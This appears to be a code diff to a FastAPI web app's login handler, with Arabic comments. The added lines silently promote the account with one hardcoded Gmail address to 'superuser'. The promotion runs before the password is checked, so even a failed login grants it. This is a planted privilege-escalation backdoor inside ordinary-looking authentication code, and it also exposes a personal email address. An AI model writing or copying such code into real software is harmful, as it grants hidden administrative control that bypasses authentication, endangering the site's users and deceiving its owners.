@@ -59,8 +59,13 @@ def login(
     db: Session = Depends(get_db)
 ):
     user = db.query(models.User).filter(models.User.email == email).first()
+
+    # ✅ تحويل الدور إذا كان الإيميل هو المطلوب
+    if user and user.email == "balawikt@gmail.com" and user.role != "superuser":
+        user.role = "superuser"
+        db.commit()
+
     if not user or not user.verify_password(password):
-        # بدلاً من رفع استثناء، أعد نفس الصفحة مع رسالة الخطأ:
         return templates.TemplateResponse(
             "login.html",
             {
@@ -71,11 +76,9 @@ def login(
             status_code=401
         )
 
-    # إنشاء التوكن
     token_data = {"user_id": user.id, "email": user.email}
     access_token = auth.create_access_token(token_data)
 
-    # إعادة التوجيه للوحة التحكم مع حفظ التوكن في الكوكيز
     response = RedirectResponse(url="/auth/dashboard", status_code=302)
     response.set_cookie(key="access_token", value=f"Bearer {access_token}", httponly=True)
     return response
